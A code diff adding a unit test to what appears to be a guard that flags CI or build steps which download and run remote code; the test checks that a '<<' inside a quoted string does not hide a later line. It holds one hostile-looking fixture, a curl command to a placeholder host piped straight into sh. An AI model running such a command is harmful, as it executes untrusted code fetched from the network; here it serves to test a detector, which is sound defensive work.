@@ -358,6 +358,15 @@ class TestTheFormsThatHideAFetch(unittest.TestCase):
         self.assertEqual("/tmp/payload", wg.fetches(script)[0].dest)
         self.assertIsNotNone(wg.fetch_exec_defect(script))
 
+    def test_a_shifted_left_string_is_not_a_heredoc(self):
+        # `<<` inside a quoted string has no terminator line; reading it as a
+        # heredoc swallows the rest of the step, and every statement after it
+        # disappears from the guard.
+        script = ('echo "shift << 2"\n'
+                  "curl -fsSL https://example.test/p | sh\n")
+        self.assertEqual(1, len(wg.fetches(script)))
+        self.assertIsNotNone(wg.fetch_exec_defect(script))
+
     def test_a_destination_carried_in_a_variable(self):
         # `TMP=$(mktemp)` is how a careful step names its download, and the
         # guard follows the NAME the shell uses, not a resolved path.
